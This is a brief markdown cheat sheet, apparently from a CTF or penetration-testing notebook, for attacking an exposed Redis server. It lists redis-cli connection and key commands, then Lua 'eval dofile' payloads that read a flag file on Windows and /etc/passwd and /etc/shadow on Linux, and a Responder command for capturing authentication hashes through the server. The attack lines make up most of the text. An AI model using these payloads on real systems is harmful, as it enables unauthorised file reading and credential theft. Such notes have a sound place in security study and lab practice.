### Connecting to redis-user database:
```
redis-cli -h <ip-address>

```

### Getting a user info

```
Get User <user>

if you get user key as nil means the user value doesn't exists  
```

### Setting a value for key or updating it:

``` Set user shahz ```

### Get info about the server
```
INFO
```

### Enumuerating [Windows]
```
eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
```

### Enumuerating [Linux]
```
EVAL dofile ('/etc/passwd') 0
EVAL dofile ('/etc/shadow') 0
```

#### Start a responder and check from redis-server
```
responder -I tun0 -dvw
```

